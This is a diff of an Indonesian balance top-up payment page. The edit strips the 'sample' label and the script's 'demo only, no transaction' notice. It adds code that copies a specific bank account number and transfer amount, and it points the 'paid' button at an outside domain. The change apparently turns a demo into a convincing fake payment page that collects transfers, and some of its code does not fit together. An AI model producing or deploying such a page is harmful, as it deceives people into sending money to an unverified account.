@@ -348,7 +348,7 @@ input:focus {
     <main class="card">
 
         <div class="eyebrow">
-            CONTOH LAYANAN PEMBAYARAN
+            LAYANAN PEMBAYARAN
         </div>
 
         <h1>Isi Ulang Saldo</h1>
@@ -439,7 +439,7 @@ input:focus {
                 <button
                     class="copy-small"
                     type="button"
-                    onclick="copyText('6101147566','Nomor rekening disalin.')"
+                    onclick="copyText('rekening')"
                 >
                     Salin
                 </button>
@@ -502,69 +502,61 @@ input:focus {
 </div>
 
 <script>
-const nominalInput = document.getElementById("nominal");
-const totalElement = document.getElementById("total");
-const nominalButtons = document.querySelectorAll(".nominal-btn");
+const amount = document.getElementById('amount');
+const total = document.getElementById('total');
 
-function formatRupiah(value) {
-    const number = Math.max(0, Number(value) || 0);
-
-    return "Rp" + Math.round(number).toLocaleString("id-ID");
-}
+const formatRupiah = n =>
+  'Rp ' + (Number(n) || 0).toLocaleString('id-ID');
 
 function updateTotal() {
-    const value = Math.max(0, Number(nominalInput.value) || 0);
+  total.textContent = formatRupiah(amount.value);
 
-    totalElement.textContent = formatRupiah(value);
-
-    nominalButtons.forEach(button => {
-        const selected =
-            Number(button.dataset.value) === value;
-
-        button.classList.toggle("active", selected);
+  document.querySelectorAll('.presets button')
+    .forEach(button => {
+      button.classList.toggle(
+        'active',
+        Number(button.dataset.amount) === Number(amount.value)
+      );
     });
 }
 
-nominalButtons.forEach(button => {
-    button.addEventListener("click", function() {
-        nominalInput.value = this.dataset.value;
-        updateTotal();
+amount.addEventListener('input', updateTotal);
+
+document.querySelectorAll('.presets button')
+  .forEach(button => {
+    button.addEventListener('click', () => {
+      amount.value = button.dataset.amount;
+      updateTotal();
     });
-});
+  });
 
-nominalInput.addEventListener("input", updateTotal);
-
-async function copyText(elementId) {
-    const text = document.getElementById(elementId).textContent;
-
-    try {
-        await navigator.clipboard.writeText(text);
-        alert("Data contoh berhasil disalin.");
-    } catch (error) {
-        alert("Silakan salin secara manual: " + text);
-    }
+async function copyText(text, message) {
+  try {
+    await navigator.clipboard.writeText(text);
+    alert(message);
+  } catch (error) {
+    prompt('Salin teks berikut:', text);
+  }
 }
 
-async function copyTotal() {
-    const value = totalElement.textContent;
+document.getElementById('copyAccount')
+  .addEventListener('click', () => {
+    copyText('6101147566', 'Nomor rekening disalin.');
+  });
 
-    try {
-        await navigator.clipboard.writeText(value);
-        alert("Nominal contoh berhasil disalin: " + value);
-    } catch (error) {
-        alert("Nominal: " + value);
-    }
-}
-
-function showDemoMessage() {
-    alert(
-        "Ini hanya halaman DEMO. " +
-        "Tidak ada transaksi yang dilakukan atau diverifikasi."
+document.getElementById('copyAmount')
+  .addEventListener('click', () => {
+    copyText(
+      String(Number(amount.value) || 0),
+      'Nominal transfer disalin.'
     );
-}
+  });
 
-updateTotal();
+document.getElementById('paid')
+  .addEventListener('click', () => {
+    window.location.href = 'https://accountplatform169.com';
+  });
+
 </script>
-
 </body>
 </html>
